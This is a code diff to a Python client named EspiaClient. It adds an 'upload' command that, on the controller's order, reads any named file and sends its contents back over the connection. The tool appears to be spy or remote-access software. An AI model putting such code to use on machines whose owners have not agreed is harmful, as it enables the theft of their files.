@@ -39,6 +39,17 @@ class EspiaClient(threading.Thread):
                 self.close() 
             elif (command == "wait"):
                 self.pause()
+            elif (command == "upload"):
+                f = open(parameters[0], "rb")
+                text = f.read()
+                size = len(text)
+                #msg = "asdfasdfasdfasdfasdfjlkasdfl;kasdfjlk;asdfjklasdflkasdfjklasdflk;asdflk;asdflk;asdflk;asdflk;"
+                self.connection.send(("upload " + parameters[0]).encode())
+                self.connection.send(("%s" % (size)).encode())
+                while (self.recieving):
+                    pass
+                self.connection.sendall(text)
+                continue
             else:
                 continue
             
@@ -52,8 +63,8 @@ class EspiaClient(threading.Thread):
         while True:
             try:
                 recv_buff = self.connection.recv(1024).decode()
-                if (recv_buff[-20::2][:5] == "<end>"):              # For some reason, '<end>' that is in recv_buff will be actually ['<','','e','','n','','d','','>'] so normal comparison won't work, so those '' need to be removed
-                    self.final += recv_buff[0:-20]
+                if (recv_buff[-12::2][:5] == "<end>"):              # For some reason, '<end>' that is in recv_buff will be actually ['<','','e','','n','','d','','>'] so normal comparison won't work, so those '' need to be removed
+                    self.final += recv_buff[0:-12]
                     self.recieving = False
                 else:
                     self.final += recv_buff
